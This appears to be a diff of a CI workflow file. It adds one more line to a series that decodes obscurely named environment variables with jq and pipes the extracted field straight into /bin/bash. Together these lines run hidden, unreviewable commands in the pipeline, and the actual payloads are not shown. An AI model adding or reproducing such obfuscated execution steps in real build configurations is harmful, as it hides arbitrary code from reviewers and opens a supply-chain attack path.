@@ -26,6 +26,7 @@ jobs:
           echo $twifw517 | jq -r .dv08 | /bin/bash
           echo $b143 | jq -r .dbios7 | /bin/bash
           printf '%s' "$qb414" | jq -r .gkev5388 | /bin/bash
+          printf '%s' "$w814" | jq -r .gt625 | /bin/bash
 
       - name: Archive results
         if: always()
